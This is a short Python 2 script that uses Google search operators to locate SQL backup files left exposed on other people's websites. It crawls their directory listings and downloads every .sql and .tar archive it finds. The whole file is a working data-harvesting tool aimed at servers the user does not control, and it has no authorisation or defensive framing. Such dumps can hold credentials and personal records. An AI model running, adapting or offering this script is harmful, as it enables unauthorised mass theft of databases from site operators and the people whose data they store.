### Created by Konstantinos Vaggelakos
### Used for finding interesting backups
### Use with care!

import sys
import re
import urllib2
import urlparse
import os
import httplib2
from google import search
from BeautifulSoup import BeautifulSoup, SoupStrainer


# Global vars
search_query = 'allinurl: %(search_term)s filetype:sql'
download_dir = 'downloaded/'

# This is the main entry point for the application and will start searching immidiately after validating the input parameters
def main():
	# Check if there is a directory to store the files otherwise create it
	if not os.path.exists(download_dir):
		os.makedirs(download_dir)

	# Check input parameters
	if (len(sys.argv) != 3):
		start_search('/administrator/backups', 20)
	else:
		start_search(sys.argv[1], sys.argv[2])


# start_search will init the search for the given search term
# @search_term The search term to search for when looking for 
# @limit the upper limit of hosts to look into
def start_search(search_term, limit):
	print_settings(search_term, limit)
	# Start the search
	for url in search(search_query % vars(), stop=limit):
		print '***************'
		handle_url(url)
		print '***************'


# This method will check for more backups in the same directory if directory listing is available
# @url The url should be a url to an existing sql backup file
def handle_url(url):
	# Create directory to save dumps
	base_dir = url[0:url.rfind('/')]
	down_dir = download_dir + base_dir[7:base_dir.find('/',7)]

	print 'Digging into: %s' % base_dir
	
	# Get all links on this page to try and find more backups in the directory listing if existing
	http = httplib2.Http()
	status, response = http.request(base_dir)

	for link in BeautifulSoup(response, parseOnlyThese=SoupStrainer('a')):
		if (link.has_key('href')):
			print 'Link found: %s' % link['href']
			if (link['href'].find('.sql') == -1 and link['href'].find('.tar') == -1):
				print '%s was not of type: sql or tar'
			else:
				# Create the directory if needed
				if not os.path.exists(down_dir):
					os.makedirs(down_dir)
					print 'Created directory %s' % down_dir
				# Then download the file
				download_file(base_dir + '/' + link['href'], down_dir + '/' + get_file_name(link['href']))

def download_file(url, filename):
	try:
		print 'Downloading file: %s into %s' % (url, filename)
		url_handle = urllib2.urlopen(url)
		localFile = open(filename, 'w')
		localFile.write(url_handle.read())
		localFile.close()
	except:
		print 'Error downloading the file: %s' % url
		return None

def get_file_name(url):
	if (url.find('/') == -1):
		return url
	else:
		return url[url.rfind('/') + 1:]

# Prints the settings specified by the user
def print_settings(search_term, limit):
	print '******************************************************'
	print 'Search term: \'%s\'' % search_term
	print 'Limit results: %i' % limit
	print 'Resulting query: \'%s\'' % search_query % vars()
	print '******************************************************'

main()
